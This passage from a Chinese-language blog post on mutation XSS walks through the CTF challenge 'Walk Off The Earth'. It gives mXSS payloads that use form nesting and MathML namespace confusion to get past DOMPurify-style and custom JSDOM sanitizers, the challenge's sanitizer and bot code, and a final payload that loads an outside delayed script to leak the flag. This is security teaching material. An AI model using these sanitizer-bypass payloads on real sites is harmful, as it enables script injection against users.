+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">&lt;/math>&lt;img src onerror=<span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>现在这个<code>mglyph</code>成为<code>mtext</code>的儿子，那么就变成了<code>MATH</code>命名空间。而<code>style</code>此时也变成<code>MATH</code>命名空间。而这个<code>img</code>自然也就变成了标签。成功<code>XSS</code>。</p>
+<img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/07d380258200443fda1dfc9823684a9.png" alt="07d380258200443fda1dfc9823684a9" style="zoom: 67%;" />
+
+<h4 id="Walk-Off-The-Earth"><a href="#Walk-Off-The-Earth" class="headerlink" title="Walk Off The Earth"></a>Walk Off The Earth</h4><p>这题有三个考点。</p>
+<p>第一个考点是绕过sha256比较，需要满足<strong>c5a5c0d64fab871c+???(你输入的字符串)的sha256开头是7个0</strong>。</p>
+<p>这个就是原题啦。</p>
+<pre><code>https://github.com/66Leo66/PoW-solver-rs
+</code></pre>
+<p>第二点就是如何<code>xss</code>，这个就是个<code>mXSS</code>啦。因为用<code>JSDOM</code>解析了一次。</p>
+<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/note'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>text<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'No note!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token operator">...</span>
+<span class="token keyword">const</span> sanitize <span class="token operator">=</span> <span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+
+    <span class="token keyword">let</span> clean <span class="token operator">=</span> <span class="token function">custom_sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> clean
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">custom_sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> BLOCKED_TAG <span class="token operator">=</span> <span class="token regex">/(script|iframe|a|img|svg|audio|video)$/i</span>
+    <span class="token keyword">const</span> BLOCKED_ATTR <span class="token operator">=</span> <span class="token regex">/(href|src|on.+)/i</span>
+
+    <span class="token keyword">const</span> document <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSDOM</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>window<span class="token punctuation">.</span>document
+    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> html
+    <span class="token keyword">let</span> node<span class="token punctuation">;</span>
+    <span class="token keyword">const</span> iter <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Before sanitization:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span>node <span class="token operator">=</span> iter<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The node is :-"</span><span class="token operator">+</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>BLOCKED_TAG<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The blocked node is :-"</span><span class="token operator">+</span>node<span class="token punctuation">.</span>tagName<span class="token punctuation">)</span>
+                node<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"After eliminating blocked:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>
+                <span class="token keyword">continue</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>node<span class="token punctuation">.</span>attributes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> node<span class="token punctuation">.</span>attributes<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">const</span> att <span class="token operator">=</span> node<span class="token punctuation">.</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>BLOCKED_ATTR<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>att<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"The blocked attribute is :-"</span><span class="token operator">+</span>att<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
+                    node<span class="token punctuation">.</span><span class="token function">removeAttributeNode</span><span class="token punctuation">(</span>att<span class="token punctuation">)</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Final payload:- "</span><span class="token operator">+</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> document<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>所以这里直接用前面提到的<code>payload</code>就可以了。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mtext</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这里的话不走到<code>catch res</code>就会被覆盖，并且即便你走到<code> puppeteer.ProtocolError</code>这个异常块里因为有个<code>finnaly</code>块，所以也会被覆盖。这里明显就是<code>await page.goto(url, &#123; waitUntil: &#39;domcontentloaded&#39;, timeout: 2000 &#125;);</code>，让这里加载<code>html</code>超过<code>2s</code>就会进入<code>catch</code>从而输出<code>flag</code>。</p>
+<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">visit</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">let</span> browser<span class="token punctuation">,</span> page<span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex">/^\/note\?/</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token string">'Invalid path!'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>BASE_URL <span class="token operator">+</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> res <span class="token operator">=</span> FLAG<span class="token punctuation">;</span>
+
+    <span class="token keyword">try</span> <span class="token punctuation">{</span>
+        browser <span class="token operator">=</span> <span class="token keyword">await</span> puppeteer<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            headless<span class="token punctuation">:</span> <span class="token string">'new'</span><span class="token punctuation">,</span>
+            args<span class="token punctuation">:</span> <span class="token punctuation">[</span>
+                <span class="token string">'--no-sandbox'</span><span class="token punctuation">,</span>
+                <span class="token string">'--disable-setuid-sandbox'</span><span class="token punctuation">,</span>
+            <span class="token punctuation">]</span><span class="token punctuation">,</span>
+            executablePath<span class="token punctuation">:</span> <span class="token string">'/usr/bin/chromium-browser'</span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        page <span class="token operator">=</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">newPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span> waitUntil<span class="token punctuation">:</span> <span class="token string">'domcontentloaded'</span><span class="token punctuation">,</span> timeout<span class="token punctuation">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">let</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            text <span class="token operator">=</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">waitForFunction</span><span class="token punctuation">(</span>text <span class="token operator">=</span><span class="token operator">></span> document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> timeout<span class="token punctuation">:</span> <span class="token number">2000</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            res <span class="token operator">=</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token keyword">instanceof</span> <span class="token class-name">puppeteer<span class="token punctuation">.</span>ProtocolError</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'Target closed'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> res<span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
+            res <span class="token operator">=</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">try</span> <span class="token punctuation">{</span> <span class="token keyword">await</span> browser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> <span class="token string">"ByeBye!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>payload:</code></p>
+<pre><code>/note?text=&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;/math&gt;&lt;script src=&#39;https://app.requestly.io/delay/3000/https://www.squirt1e.top/&#39;&gt;&lt;/script&gt;
+</code></pre>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><ol>
+<li><a target="_blank" rel="noopener" href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8384">https://xz.aliyun.com/t/8384</a></li>
+<li><a target="_blank" rel="noopener" href="https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-solar-system">https://boogipop.com/2023/12/01/TPCTF%202023%20Web%20Writeup/#walk-off-the-solar-system</a></li>
+</ol>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://www.squirt1e.top">Squirt1e</a></p><p> <span>Link:  </span><a href="http://www.squirt1e.top/2023/12/04/mutation-xss-tu-bian-xss/">http://www.squirt1e.top/2023/12/04/mutation-xss-tu-bian-xss/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2023/12/03/dom-clobbering/" title="dom-clobbering学习+XSS GAME简单题"><span>NextPost ></span><br><span class="nextTitle">dom-clobbering学习+XSS GAME简单题</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFmXSS"><span class="toc-number">1.</span> <span class="toc-text">什么是mXSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#form%E8%A1%A8%E5%8D%95%E5%B5%8C%E5%A5%97"><span class="toc-number">2.</span> <span class="toc-text">form表单嵌套</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E6%B7%B7%E6%B7%86"><span class="toc-number">3.</span> <span class="toc-text">命名空间混淆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOMPurify%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">DOMPurify绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Walk-Off-The-Earth"><span class="toc-number">5.</span> <span class="toc-text">Walk Off The Earth</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">参考文章</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
